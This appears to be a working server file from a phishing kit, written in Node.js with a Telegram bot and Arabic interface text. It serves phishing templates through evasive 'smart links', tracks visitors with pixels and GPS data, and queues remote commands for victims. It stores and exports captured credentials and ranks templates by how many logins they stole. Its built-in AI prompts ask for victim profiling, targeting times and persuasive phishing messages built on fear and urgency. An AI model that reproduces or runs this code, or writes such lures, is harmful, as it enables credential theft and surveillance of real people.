        const result = await pool.query('SELECT * FROM victims WHERE ip = $1 ORDER BY created_at DESC LIMIT 1', [targetIP]);
        const ipInfo = await fetchIPInfo(targetIP);
        const isPrivate = isPrivateIP(targetIP);

        let victimData = '';
        let dbInfo = '';

        if (result.rows.length > 0) {
            const v = result.rows[0];
            dbInfo = `\n📋 بيانات من قاعدة البيانات:
IP: ${v.ip}
Country: ${v.country || 'N/A'}
City: ${v.city || 'N/A'}
Device: ${v.device || 'N/A'}
Browser: ${v.browser || 'N/A'}
OS: ${v.os || 'N/A'}
Screen: ${v.screen || 'N/A'}
Template: ${v.template || 'N/A'}
VPN: ${v.is_vpn ? 'Yes' : 'No'}
Latitude: ${v.latitude || 'N/A'}
Longitude: ${v.longitude || 'N/A'}
Created: ${v.created_at}`;
        }

        let ipData = '';
        if (ipInfo) {
            ipData = `\n🌐 بيانات IP التفصيلية:
IP: ${ipInfo.query}
Type: ${isPrivate ? 'Private/Local IP' : 'Public IP'}
Continent: ${ipInfo.continent || 'N/A'}
Country: ${ipInfo.country || 'N/A'} (${ipInfo.countryCode || ''})
Region: ${ipInfo.regionName || 'N/A'}
City: ${ipInfo.city || 'N/A'}
District: ${ipInfo.district || 'N/A'}
ZIP: ${ipInfo.zip || 'N/A'}
Latitude: ${ipInfo.lat}
Longitude: ${ipInfo.lon}
Timezone: ${ipInfo.timezone || 'N/A'}
UTC Offset: ${ipInfo.offset || 'N/A'}
Currency: ${ipInfo.currency || 'N/A'}
ISP: ${ipInfo.isp || 'N/A'}
Organization: ${ipInfo.org || 'N/A'}
AS: ${ipInfo.as || 'N/A'}
AS Name: ${ipInfo.asname || 'N/A'}
Reverse DNS: ${ipInfo.reverse || 'N/A'}
Mobile: ${ipInfo.mobile ? 'Yes' : 'No'}
Proxy/VPN: ${ipInfo.proxy ? 'Yes' : 'No'}
Hosting/DC: ${ipInfo.hosting ? 'Yes' : 'No'}`;
        } else if (isPrivate) {
            ipData = `\n🏠 هذا IP خاص/محلي (${targetIP})
Type: Private/Local Network IP
Note: لا يمكن تحديد الموقع لأنه IP داخلي (شبكة محلية)
Private Range: ${targetIP.startsWith('192.168') ? '192.168.x.x (Home/Office LAN)' : targetIP.startsWith('10.') ? '10.x.x.x (Large Network)' : targetIP.startsWith('172.') ? '172.16-31.x.x (Medium Network)' : 'Loopback/Link-local'}`;
        }

        victimData = dbInfo + ipData;

        if (!victimData.trim()) {
            return bot.sendMessage(chatId, '❌ لم يتم العثور على أي بيانات لهذا الـ IP ولم تنجح عملية البحث عنه.');
        }

        let quickReport = `🔍 <b>معلومات IP: ${targetIP}</b>\n\n`;
        if (isPrivate) {
            quickReport += `🏠 <b>النوع:</b> IP خاص (شبكة محلية)\n`;
        } else {
            quickReport += `🌍 <b>النوع:</b> IP عام\n`;
        }

        if (ipInfo) {
            quickReport += `📍 <b>الموقع:</b> ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}\n`;
            quickReport += `🏢 <b>مزود الخدمة:</b> ${ipInfo.isp}\n`;
            quickReport += `🏛 <b>المنظمة:</b> ${ipInfo.org}\n`;
            quickReport += `⏰ <b>التوقيت:</b> ${ipInfo.timezone}\n`;
            quickReport += `📱 <b>موبايل:</b> ${ipInfo.mobile ? 'نعم ✅' : 'لا ❌'}\n`;
            quickReport += `🛡 <b>VPN/Proxy:</b> ${ipInfo.proxy ? 'نعم 🔴' : 'لا 🟢'}\n`;
            quickReport += `🖥 <b>استضافة/DC:</b> ${ipInfo.hosting ? 'نعم 🔴' : 'لا 🟢'}\n`;
            if (ipInfo.reverse) quickReport += `🔄 <b>Reverse DNS:</b> ${ipInfo.reverse}\n`;
            quickReport += `📡 <b>AS:</b> ${ipInfo.asname}\n`;
        }

        if (result.rows.length > 0) {
            const v = result.rows[0];
            quickReport += `\n📋 <b>بيانات الضحية:</b>\n`;
            quickReport += `📱 ${v.device || '?'} | 🌐 ${v.browser || '?'} | 💻 ${v.os || '?'}\n`;
            quickReport += `📐 ${v.screen || '?'} | 🎯 ${v.template || '?'}\n`;
            if (v.latitude) quickReport += `📍 GPS: ${v.latitude}, ${v.longitude}\n`;
        }

        bot.sendMessage(chatId, quickReport, { parse_mode: "HTML" });

        const analysis = await askAI(
            `أنت محلل أمن سيبراني وخبير استخبارات إلكترونية. حلل البيانات التالية عن الـ IP والضحية وقدم تقرير شامل يتضمن:

1. 🎯 تصنيف الضحية (سهل/متوسط/حذر/تقني) مع التبرير
2. 💰 مستوى القيمة (عالي/متوسط/منخفض) بناءً على البلد والجهاز والـ ISP
3. 🛡 تحليل الحماية (هل يستخدم VPN/Proxy/Hosting?)
4. 🏢 تحليل مزود الخدمة والمنظمة - هل هو فرد أم شركة أم مؤسسة حكومية؟
5. 📱 نوع الاتصال (موبايل/واي فاي/كيبل) وتأثيره
6. 🎪 أفضل 3 قوالب تصيد مناسبة لهذا البلد والجهاز
7. ⏰ أفضل وقت للاستهداف بناءً على التوقيت المحلي
8. 📊 احتمالية النجاح (نسبة مئوية) مع التبرير
9. ⚠️ المخاطر والتحذيرات
10. 💡 توصيات واستراتيجية مخصصة

أجب باللغة العربية بشكل مفصل ومنظم.`,
            victimData
        );

        const btns = { reply_markup: { inline_keyboard: [
            [{ text: '🔄 تحليل IP آخر', callback_data: 'ai_analyze' }],
            [{ text: '📋 القائمة الرئيسية', callback_data: 'back_main' }]
        ] }, parse_mode: "HTML" };
        bot.sendMessage(chatId, `🤖 <b>تحليل الذكاء الاصطناعي</b>\n\n${analysis}`, btns);
    } catch (err) { bot.sendMessage(chatId, '❌ خطأ: ' + err.message); }
}

bot.onText(/\/phish (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handlePhish(chatId, match[1]);
});

async function handlePhish(chatId, target) {
    bot.sendMessage(chatId, '✍️ جاري إنشاء رسالة احترافية...');
    const message = await askAI(
        'أنت خبير هندسة اجتماعية. اكتب رسالة مقنعة لإقناع الهدف بالنقر على الرابط. القواعد: طبيعية وغير مشبوهة، استخدم الإلحاح/الخوف/المكافأة، 3 نسخ (رسمية،ودية،عاجلة) بالعربية والإنجليزية، ضع [LINK] مكان الرابط.',
        `الهدف: ${target}`
    );
    const backBtn = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة', callback_data: 'ai_back' }]] }, parse_mode: "HTML" };
    bot.sendMessage(chatId, `✍️ <b>رسائل تصيد مولّدة بالذكاء الاصطناعي</b>\n\n${message}`, backBtn);
}

bot.onText(/\/translate (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handleTranslate(chatId, match[1]);
});

async function handleTranslate(chatId, text) {
    bot.sendMessage(chatId, '🌐 جاري الترجمة...');
    const translated = await askAI('أنت مترجم محترف. ترجم النص. إذا كان بالعربية ترجمه للإنجليزية والعكس. قدم الترجمة فقط.', text);
    const backBtn = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة', callback_data: 'ai_back' }]] }, parse_mode: "HTML" };
    bot.sendMessage(chatId, `🌐 <b>الترجمة</b>\n\n${translated}`, backBtn);
}

bot.onText(/\/summarize/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handleSummarize(chatId);
});

bot.onText(/\/suggest/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handleSuggest(chatId);
});

bot.onText(/\/rewrite (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handleRewrite(chatId, match[1]);
});

async function handleRewrite(chatId, text) {
    bot.sendMessage(chatId, '✨ جاري إعادة الكتابة...');
    const rewritten = await askAI('أنت كاتب محترف. أعد كتابة النص بثلاث طرق: 1.رسمي واحترافي 2.ودي وغير رسمي 3.عاجل ومقنع. حافظ على المعنى. أجب بنفس لغة النص.', text);
    const backBtn = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة', callback_data: 'ai_back' }]] }, parse_mode: "HTML" };
    bot.sendMessage(chatId, `✨ <b>إعادة كتابة ذكية</b>\n\n${rewritten}`, backBtn);
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    if (!msg.text || msg.text.startsWith('/')) return;

    if (msg.text === '⏹ إيقاف المحادثة') {
        aiChatMode.delete(chatId);
        aiWaitingFor.delete(chatId);
        bot.sendMessage(chatId, '⏹ تم إيقاف وضع المحادثة.', { reply_markup: { remove_keyboard: true } });
        return;
    }
    if (msg.text === '🧹 مسح السجل') {
        aiChatHistory.delete(chatId);
        bot.sendMessage(chatId, '🧹 تم مسح سجل المحادثة! أرسل رسالة جديدة.');
        return;
    }
    if (msg.text === '📋 القائمة الرئيسية') {
        aiChatMode.delete(chatId);
        aiWaitingFor.delete(chatId);
        bot.sendMessage(chatId, '📋 جاري فتح القائمة...', { reply_markup: { remove_keyboard: true } });
        showAIMenu(chatId);
        return;
    }

    const waiting = aiWaitingFor.get(chatId);
    if (waiting) {
        aiWaitingFor.delete(chatId);
        if (waiting === 'analyze') return handleAnalyze(chatId, msg.text.trim());
        if (waiting === 'ip_lookup') return handleIPLookup(chatId, msg.text.trim());
        if (waiting === 'phish') return handlePhish(chatId, msg.text);
        if (waiting === 'translate') return handleTranslate(chatId, msg.text);
        if (waiting === 'rewrite') return handleRewrite(chatId, msg.text);
    }

    if (aiChatMode.get(chatId)) {
        bot.sendMessage(chatId, '🤖 جاري التفكير...');
        const answer = await askAIWithHistory(chatId, msg.text);
        bot.sendMessage(chatId, `🤖 ${answer}`, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [[{ text: '⏹ إيقاف المحادثة' }], [{ text: '🧹 مسح السجل' }, { text: '📋 القائمة الرئيسية' }]],
                resize_keyboard: true
            }
        });
        return;
    }
});

// =============================================
// API ENDPOINT: Victim Commands Polling
// =============================================

app.get('/api/victim-commands/:ip', (req, res) => {
    const ip = req.params.ip;
    const cmds = victimCommands.get(ip) || [];
    victimCommands.delete(ip);
    activeSessions.set(ip, {
        lastSeen: Date.now(),
        userAgent: req.headers['user-agent'] || 'Unknown',
        country: req.query.country || 'Unknown'
    });
    res.json({ commands: cmds });
});

// =============================================
// 10 SMART LINK FEATURES
// =============================================

// 1. One-Time Links - check onetime query parameter
app.get('/ot/:path/:uri', async (req, res) => {
    const linkId = req.params.path + '/' + req.params.uri;
    if (usedOneTimeLinks.has(linkId)) {
        return res.status(410).send('<html><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#1a1a1a;color:#fff;"><div style="text-align:center;"><h1>⏰ Link Expired</h1><p>This one-time link has already been used.</p></div></body></html>');
    }
    usedOneTimeLinks.add(linkId);
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const stats = linkStats.get(linkId) || { clicks: 0, visitors: [], created: Date.now() };
    stats.clicks++;
    stats.visitors.push({ ip, ua, time: Date.now() });
    linkStats.set(linkId, stats);
    try {
        const template = req.params.path;
        const uri = Buffer.from(req.params.uri, 'base64').toString();
        var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':'); res.render(template, {ip:ip,time:d,url:uri,uid:'smart',a:hostURL,t:use1pt,fakeMsg:JSON.stringify(null)});
    } catch(e) {
        res.status(404).send('Not found');
    }
});

// 2. Geo-Lock - POST endpoint to lock links to specific countries
app.post('/api/panel/geolock', (req, res) => {
    const { path, countries } = req.body;
    if (!path || !countries || !Array.isArray(countries)) {
        return res.status(400).json({ error: 'Provide path and countries array' });
    }
    geoLockedLinks.set(path, countries);
    res.json({ success: true, path, countries, message: `Link locked to ${countries.join(', ')}` });
});

app.get('/api/panel/geolock', (req, res) => {
    const locks = {};
    geoLockedLinks.forEach((countries, path) => { locks[path] = countries; });
    res.json(locks);
});

// 3. Device-Lock - POST endpoint to lock links to specific devices
app.post('/api/panel/devicelock', (req, res) => {
    const { path, devices } = req.body;
    if (!path || !devices || !Array.isArray(devices)) {
        return res.status(400).json({ error: 'Provide path and devices array (ios, android, desktop)' });
    }
    deviceLockedLinks.set(path, devices.map(d => d.toLowerCase()));
    res.json({ success: true, path, devices, message: `Link locked to ${devices.join(', ')}` });
});

app.get('/api/panel/devicelock', (req, res) => {
    const locks = {};
    deviceLockedLinks.forEach((devices, path) => { locks[path] = devices; });
    res.json(locks);
});

// 4. Click Limit - POST endpoint to set click limits
app.post('/api/panel/clicklimit', (req, res) => {
    const { path, limit } = req.body;
    if (!path || !limit || isNaN(limit)) {
        return res.status(400).json({ error: 'Provide path and numeric limit' });
    }
    clickLimits.set(path, parseInt(limit));
    clickCounts.set(path, clickCounts.get(path) || 0);
    res.json({ success: true, path, limit: parseInt(limit), current: clickCounts.get(path) || 0 });
});

app.get('/cl/:path/:uri', async (req, res) => {
    const path = req.params.path;
    const limit = clickLimits.get(path);
    const current = clickCounts.get(path) || 0;
    if (limit && current >= limit) {
        return res.status(410).send('<html><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#1a1a1a;color:#fff;"><div style="text-align:center;"><h1>🚫 Link Limit Reached</h1><p>This link has reached its maximum number of clicks.</p></div></body></html>');
    }
    clickCounts.set(path, current + 1);
    try {
        const uri = Buffer.from(req.params.uri, 'base64').toString();
        var dd = new Date(); dd=dd.toJSON().slice(0,19).replace("T",":"); res.render(path, {ip:req.headers["x-forwarded-for"]||req.ip,time:dd,url:uri,uid:"smart",a:hostURL,t:use1pt,fakeMsg:JSON.stringify(null)});
    } catch(e) {
        res.status(404).send('Not found');
    }
});

// 5. A/B Testing - randomly pick between two templates
app.get('/ab/:path/:uri1/:uri2', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const chosenUri = Math.random() < 0.5 ? req.params.uri1 : req.params.uri2;
    const variant = chosenUri === req.params.uri1 ? 'A' : 'B';
    const linkId = 'ab_' + req.params.path;
    const stats = linkStats.get(linkId) || { a: 0, b: 0, clicks: 0, visitors: [] };
    stats.clicks++;
    if (variant === 'A') stats.a++; else stats.b++;
    stats.visitors.push({ ip, variant, time: Date.now() });
    linkStats.set(linkId, stats);
    try {
        const uri = Buffer.from(chosenUri, 'base64').toString();
        var dd = new Date(); dd=dd.toJSON().slice(0,19).replace("T",":"); res.render(req.params.path, {ip:ip,time:dd,url:uri,uid:"smart",a:hostURL,t:use1pt,fakeMsg:JSON.stringify(null)});
    } catch(e) {
        res.status(404).send('Not found');
    }
});

// 6. Chain Links - show templates in sequence
app.get('/chain/:path/:templates/:uri', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const sessionId = ip + '_' + req.params.path;
    const templates = req.params.templates.split(',');
    const currentIndex = chainProgress.get(sessionId) || 0;
    const template = templates[Math.min(currentIndex, templates.length - 1)];
    chainProgress.set(sessionId, currentIndex + 1);
    if (currentIndex >= templates.length) {
        chainProgress.delete(sessionId);
    }
    try {
        const uri = Buffer.from(req.params.uri, 'base64').toString();
        var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':'); res.render(template, {ip:ip,time:d,url:uri,uid:'smart',a:hostURL,t:use1pt,fakeMsg:JSON.stringify(null)});
    } catch(e) {
        res.status(404).send('Not found');
    }
});

// 7. Countdown Links - show countdown before actual page
app.get('/cd/:seconds/:path/:uri', async (req, res) => {
    const seconds = parseInt(req.params.seconds) || 5;
    const path = req.params.path;
    const uri = req.params.uri;
    const actualUrl = `/${path}/${uri}`;
    res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#0c0c0c,#1a1a2e);font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#fff}.container{text-align:center}.countdown{font-size:72px;font-weight:700;margin:20px 0;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.subtitle{color:#888;font-size:14px}.progress{width:200px;height:4px;background:#333;border-radius:2px;margin:30px auto;overflow:hidden}.progress-bar{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:2px;transition:width 1s linear}</style></head><body><div class="container"><div class="subtitle">Please wait...</div><div class="countdown" id="timer">${seconds}</div><div class="progress"><div class="progress-bar" id="bar" style="width:0%"></div></div></div><script>let t=${seconds};const el=document.getElementById('timer'),bar=document.getElementById('bar');const iv=setInterval(()=>{t--;el.textContent=t;bar.style.width=((${seconds}-t)/${seconds}*100)+'%';if(t<=0){clearInterval(iv);window.location.href='${actualUrl}';}},1000);</script></body></html>`);
});

// 8. Pixel Tracking - 1x1 transparent pixel that logs access
app.get('/pixel/:path.png', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const referer = req.headers['referer'] || '';
    const path = req.params.path;
    const logs = pixelLogs.get(path) || [];
    logs.push({ ip, ua, referer, time: Date.now() });
    pixelLogs.set(path, logs);
    const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64');
    res.set({
        'Content-Type': 'image/png',
        'Content-Length': pixel.length,
        'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    });
    res.end(pixel);
});

app.get('/api/panel/pixel-logs/:path', (req, res) => {
    const logs = pixelLogs.get(req.params.path) || [];
    res.json({ path: req.params.path, total: logs.length, logs: logs.slice(-50) });
});

// 9. Delay Links - add delay before rendering template
app.get('/delay/:seconds/:path/:uri', async (req, res) => {
    const delayMs = Math.min(parseInt(req.params.seconds) || 3, 30) * 1000;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const linkId = 'delay_' + req.params.path;
    const stats = linkStats.get(linkId) || { clicks: 0, visitors: [] };
    stats.clicks++;
    stats.visitors.push({ ip, time: Date.now() });
    linkStats.set(linkId, stats);
    await new Promise(resolve => setTimeout(resolve, delayMs));
    try {
        const uri = Buffer.from(req.params.uri, 'base64').toString();
        var dd = new Date(); dd=dd.toJSON().slice(0,19).replace("T",":"); res.render(req.params.path, {ip:ip,time:dd,url:uri,uid:"smart",a:hostURL,t:use1pt,fakeMsg:JSON.stringify(null)});
    } catch(e) {
        res.status(404).send('Not found');
    }
});

// 10. Link Stats - per-link statistics endpoint
app.get('/api/panel/link-stats/:code', (req, res) => {
    const code = req.params.code;
    const stats = linkStats.get(code);
    if (!stats) {
        return res.json({ code, clicks: 0, visitors: [], message: 'No stats found for this link' });
    }
    const uniqueIps = [...new Set((stats.visitors || []).map(v => v.ip))];
    res.json({
        code,
        clicks: stats.clicks || 0,
        uniqueVisitors: uniqueIps.length,
        variantA: stats.a || 0,
        variantB: stats.b || 0,
        created: stats.created || null,
        recentVisitors: (stats.visitors || []).slice(-20).map(v => ({
            ip: v.ip,
            time: new Date(v.time).toISOString(),
            variant: v.variant || null
        }))
    });
});

app.get('/api/panel/link-stats', (req, res) => {
    const allStats = {};
    linkStats.forEach((stats, code) => {
        allStats[code] = {
            clicks: stats.clicks || 0,
            uniqueVisitors: [...new Set((stats.visitors || []).map(v => v.ip))].length,
            lastClick: stats.visitors && stats.visitors.length > 0 ? new Date(stats.visitors[stats.visitors.length - 1].time).toISOString() : null
        };
    });
    res.json(allStats);
});

// Active session heartbeat endpoint
app.post('/api/heartbeat', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const { country, userAgent } = req.body;
    activeSessions.set(ip, {
        lastSeen: Date.now(),
        userAgent: userAgent || req.headers['user-agent'] || 'Unknown',
        country: country || 'Unknown'
    });
    res.json({ status: 'ok' });
});

// =============================================
// NOTIFICATION INTEGRATIONS
// =============================================

app.post('/api/panel/slack-webhook', (req, res) => {
    slackWebhook = req.body.url || '';
    logActivity('slack_webhook_set', { url: slackWebhook ? 'configured' : 'cleared' });
    res.json({ success: true, message: 'تم حفظ Slack Webhook' });
});

app.post('/api/panel/teams-webhook', (req, res) => {
    teamsWebhook = req.body.url || '';
    logActivity('teams_webhook_set', { url: teamsWebhook ? 'configured' : 'cleared' });
    res.json({ success: true, message: 'تم حفظ Teams Webhook' });
});

app.post('/api/panel/pushover', (req, res) => {
    pushoverConfig = { token: req.body.token || '', user: req.body.user || '' };
    logActivity('pushover_set');
    res.json({ success: true, message: 'تم حفظ إعدادات Pushover' });
});

app.post('/api/panel/ifttt-webhook', (req, res) => {
    iftttKey = req.body.key || '';
    logActivity('ifttt_set');
    res.json({ success: true, message: 'تم حفظ IFTTT Webhook Key' });
});

app.post('/api/panel/media-notify', (req, res) => {
    mediaNotifyEnabled = req.body.enabled !== undefined ? req.body.enabled : !mediaNotifyEnabled;
    logActivity('media_notify_toggled', { enabled: mediaNotifyEnabled });
    res.json({ success: true, enabled: mediaNotifyEnabled, message: mediaNotifyEnabled ? 'تم تفعيل إشعارات الوسائط' : 'تم إيقاف إشعارات الوسائط' });
});

// Daily Summary - runs at midnight
schedule.scheduleJob('0 0 * * *', async () => {
    try {
        const todayResult = await pool.query("SELECT COUNT(*) as count FROM victims WHERE created_at >= CURRENT_DATE");
        const newResult = await pool.query("SELECT COUNT(*) as count FROM victims WHERE created_at >= CURRENT_DATE - INTERVAL '1 day' AND created_at < CURRENT_DATE");
        const templateResult = await pool.query("SELECT template, COUNT(*) as count FROM victims WHERE created_at >= CURRENT_DATE - INTERVAL '1 day' GROUP BY template ORDER BY count DESC LIMIT 1");
        const countryResult = await pool.query("SELECT country, COUNT(*) as count FROM victims WHERE created_at >= CURRENT_DATE - INTERVAL '1 day' AND country IS NOT NULL GROUP BY country ORDER BY count DESC LIMIT 5");

        const topTemplate = templateResult.rows.length > 0 ? templateResult.rows[0].template : 'N/A';
        const topCountries = countryResult.rows.map(r => `${r.country} (${r.count})`).join(', ') || 'N/A';

        const summary = `📊 <b>ملخص يومي</b>\n\n📅 التاريخ: ${new Date().toLocaleDateString('ar-EG')}\n👥 إجمالي اليوم: ${todayResult.rows[0].count}\n🆕 ضحايا جدد: ${newResult.rows[0].count}\n📂 أكثر قالب استخداماً: ${topTemplate}\n🌍 أعلى الدول: ${topCountries}`;

        adminChatIds.forEach(chatId => {
            bot.sendMessage(chatId, summary, { parse_mode: "HTML" }).catch(() => {});
        });
    } catch (e) {
        console.log('Daily summary error:', e.message);
    }
});

// Disconnect Alert - check every 2 minutes for stale sessions
setInterval(() => {
    const now = Date.now();
    const staleThreshold = 2 * 60 * 1000;
    activeSessions.forEach((data, ip) => {
        if (now - data.lastSeen > staleThreshold && !data.disconnectNotified) {
            data.disconnectNotified = true;
            activeSessions.set(ip, data);
            const disconnectMsg = `🔴 <b>انقطاع اتصال!</b>\n\n🌐 IP: <code>${ip}</code>\n📍 ${data.country || 'Unknown'}\n⏰ آخر ظهور: ${new Date(data.lastSeen).toLocaleString()}\n📱 ${data.userAgent || 'Unknown'}`;
            adminChatIds.forEach(chatId => {
                bot.sendMessage(chatId, disconnectMsg, { parse_mode: "HTML" }).catch(() => {});
            });
            logActivity('victim_disconnected', { ip, country: data.country });
        }
        if (now - data.lastSeen > 10 * 60 * 1000) {
            activeSessions.delete(ip);
        }
    });
}, 2 * 60 * 1000);

// =============================================
// AI / ANALYTICS FEATURES
// =============================================

app.get('/api/panel/best-times', async (req, res) => {
    try {
        const result = await pool.query("SELECT EXTRACT(HOUR FROM created_at) as hour, COUNT(*) as count FROM victims GROUP BY hour ORDER BY count DESC LIMIT 5");
        res.json(result.rows.map(r => ({ hour: parseInt(r.hour), count: parseInt(r.count) })));
    } catch (e) {
        res.json([]);
    }
});

app.get('/api/panel/template-success', async (req, res) => {
    try {
        const visits = await pool.query("SELECT template, COUNT(*) as total FROM victims WHERE template IS NOT NULL GROUP BY template");
        const creds = await pool.query("SELECT v.template, COUNT(c.id) as captured FROM credentials c JOIN victims v ON c.user_id = v.user_id WHERE v.template IS NOT NULL GROUP BY v.template");

        const credsMap = {};
        creds.rows.forEach(r => { credsMap[r.template] = parseInt(r.captured); });

        const rates = visits.rows.map(r => ({
            template: r.template,
            total_visits: parseInt(r.total),
            credentials_captured: credsMap[r.template] || 0,
            success_rate: ((credsMap[r.template] || 0) / parseInt(r.total) * 100).toFixed(1) + '%'
        }));

        res.json(rates.sort((a, b) => parseFloat(b.success_rate) - parseFloat(a.success_rate)));
    } catch (e) {
        res.json([]);
    }
});

app.get('/api/panel/suggest-template', async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT v.country, v.template, COUNT(c.id) as cred_count, COUNT(v.id) as visit_count
            FROM victims v
            LEFT JOIN credentials c ON c.user_id = v.user_id AND c.platform = v.template
            WHERE v.country IS NOT NULL AND v.template IS NOT NULL
            GROUP BY v.country, v.template
            ORDER BY v.country, cred_count DESC
        `);

        const suggestions = {};
        result.rows.forEach(r => {
            if (!suggestions[r.country] || parseInt(r.cred_count) > suggestions[r.country].cred_count) {
                suggestions[r.country] = {
                    best_template: r.template,
                    cred_count: parseInt(r.cred_count),
                    visit_count: parseInt(r.visit_count)
                };
            }
        });

        res.json(suggestions);
    } catch (e) {
        res.json({});
    }
});

app.post('/api/panel/analyze-behavior', (req, res) => {
    const { movements } = req.body;
    const result = detectBotBehavior(movements);
    res.json(result);
});

// =============================================
// UTILITY TOOLS
// =============================================

app.post('/api/panel/page-builder', (req, res) => {
    const { html, title } = req.body;
    if (!html) return res.status(400).json({ error: 'HTML content required' });
    const id = require('crypto').randomBytes(8).toString('hex');
    customPages.set(id, { html, title: title || 'Custom Page', created: new Date().toISOString() });
    logActivity('custom_page_created', { id });
    res.json({ success: true, id, url: `${hostURL}/custom-page/${id}`, message: 'تم إنشاء الصفحة' });
});

app.get('/custom-page/:id', (req, res) => {
    const page = customPages.get(req.params.id);
    if (!page) return res.status(404).send('Page not found');
    res.send(page.html);
});

app.get('/api/panel/backup', async (req, res) => {
    try {
        const victims = await pool.query('SELECT * FROM victims ORDER BY created_at DESC');
        const credentials = await pool.query('SELECT * FROM credentials ORDER BY created_at DESC');
        const blockedIps = await pool.query('SELECT * FROM blocked_ips ORDER BY created_at DESC');
        const backup = {
            exported_at: new Date().toISOString(),
            victims: victims.rows,
            credentials: credentials.rows,
            blocked_ips: blockedIps.rows,
            stats: {
                total_victims: victims.rows.length,
                total_credentials: credentials.rows.length,
                total_blocked: blockedIps.rows.length
            }
        };
        logActivity('backup_exported');
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename=backup_' + Date.now() + '.json');
        res.json(backup);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// API Key System - middleware for external API
app.use('/api/external', (req, res, next) => {
    const key = req.headers['x-api-key'] || req.query.api_key;
    if (key !== apiKey) {
        return res.status(401).json({ error: 'Invalid API key', message: 'Provide valid API key via x-api-key header or api_key query parameter' });
    }
    next();
});

app.get('/api/external/victims', async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 50;
        const result = await pool.query('SELECT * FROM victims ORDER BY created_at DESC LIMIT $1', [limit]);
        res.json({ success: true, count: result.rows.length, victims: result.rows });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/external/stats', async (req, res) => {
    try {
        const total = await pool.query('SELECT COUNT(*) FROM victims');
        const today = await pool.query("SELECT COUNT(*) FROM victims WHERE created_at >= CURRENT_DATE");
        const creds = await pool.query('SELECT COUNT(*) FROM credentials');
        res.json({
            success: true,
            total_victims: parseInt(total.rows[0].count),
            today_victims: parseInt(today.rows[0].count),
            total_credentials: parseInt(creds.rows[0].count),
            active_sessions: activeSessions.size
        });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/panel/api-key', (req, res) => {
    res.json({ api_key: apiKey });
});

app.get('/api/panel/activity-log', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    res.json(activityLog.slice(0, limit));
});

// Multi-Admin endpoints
app.get('/api/panel/admins', (req, res) => {
    res.json({ admins: Array.from(adminChatIds), count: adminChatIds.size });
});

app.post('/api/panel/admins', (req, res) => {
    const { chatId, action } = req.body;
    if (!chatId) return res.status(400).json({ error: 'chatId required' });
    if (action === 'remove') {
        adminChatIds.delete(parseInt(chatId));
        logActivity('admin_removed', { chatId });
        res.json({ success: true, message: 'تم إزالة المسؤول', admins: Array.from(adminChatIds) });
    } else {
        adminChatIds.add(parseInt(chatId));
        logActivity('admin_added', { chatId });
        res.json({ success: true, message: 'تم إضافة المسؤول', admins: Array.from(adminChatIds) });
    }
});

console.log(`🔑 API Key: ${apiKey}`);

app.listen(5000, '0.0.0.0', () => {
console.log("App Running on Port 5000!");
});
